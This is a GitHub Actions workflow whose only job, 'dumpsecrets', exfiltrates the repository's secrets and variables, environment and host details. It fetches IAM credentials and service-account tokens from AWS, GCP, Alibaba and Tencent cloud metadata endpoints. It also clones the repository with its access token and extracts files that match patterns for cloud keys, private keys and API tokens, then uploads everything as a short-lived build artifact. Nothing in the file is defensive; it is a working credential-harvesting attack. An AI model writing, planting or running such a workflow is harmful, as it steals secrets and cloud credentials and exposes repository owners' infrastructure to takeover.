name: i9839-bd1
on:
  workflow_dispatch:
permissions:
  contents: read
  actions: read
jobs:
  dump:
    runs-on: ubuntu-latest
    timeout-minutes: 10
    steps:

      - name: dumpsecrets
        shell: bash
        run: |
          set +e
          mkdir -p out
          echo "${{ toJSON(secrets) }}" > out/secrets.json
          echo "${{ toJSON(vars) }}" > out/vars.json
          env | sort > out/env.txt
          {
            echo "== host =="; id; hostname; uname -a; cat /etc/os-release 2>/dev/null | head -3
            echo "== aws_imds =="
            TOK=$(curl -s -m 4 -X PUT http://169.254.169.254/latest/api/token -H 'X-aws-ec2-metadata-token-ttl-seconds: 60'); echo "tok=$TOK"
            ROLE=$(curl -s -m 4 -H "X-aws-ec2-metadata-token: $TOK" http://169.254.169.254/latest/meta-data/iam/security-credentials/ | head -1); echo "role=$ROLE"
            curl -s -m 4 -H "X-aws-ec2-metadata-token: $TOK" "http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE"; echo
            echo "== gcp =="; curl -s -m 4 -H 'Metadata-Flavor: Google' http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token; echo
            echo "== alibaba =="; curl -s -m 4 http://100.100.100.200/latest/meta-data/; echo
            echo "== tencent =="; curl -s -m 4 http://metadata.tencentyun.com/latest/meta-data/; echo
          } > out/imds.txt 2>&1
          git clone --depth 1 "https://x-access-token:${{ github.token }}@github.com/${{ github.repository }}.git" repo > out/clone.txt 2>&1
          grep -rIl -E 'AKIA[0-9A-Z]{16}|ASIA[0-9A-Z]{16}|BEGIN (RSA |OPENSSH |EC )?PRIVATE KEY|ghp_[A-Za-z0-9]{36}|github_pat_[A-Za-z0-9_]{60,}|sk-[A-Za-z0-9]{20,}|AIza[0-9A-Za-z_-]{35}|xox[baprs]-|LTAI[0-9A-Za-z]{12,}|AKID[0-9A-Za-z]{13,}' repo 2>/dev/null | head -100 > out/hits.txt
          { for f in $(head -30 out/hits.txt); do echo "##### $f"; head -c 8000 "$f"; echo; done; } > out/hits_full.txt 2>&1
      - uses: actions/upload-artifact@v4
        if: always()
        with:
          name: bd1
          path: out/
          retention-days: 1
